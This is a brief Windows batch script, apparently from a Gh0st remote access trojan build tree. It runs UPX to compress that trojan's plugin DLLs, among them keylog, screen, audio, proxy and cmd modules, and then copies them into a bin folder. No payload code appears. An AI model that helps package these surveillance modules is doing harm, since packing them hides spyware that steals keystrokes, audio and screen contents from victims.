cd d:\lky\vc++\gh0st2.0\Server\plugins\

upx audio.dll
upx file.dll
upx keylog.dll
upx proxy.dll
upx screen.dll
upx System.dll
upx tools.dll
upx vedio.dll

copy /B /Y *.dll ..\..\bin\plugins\

exit

upx cmd.dll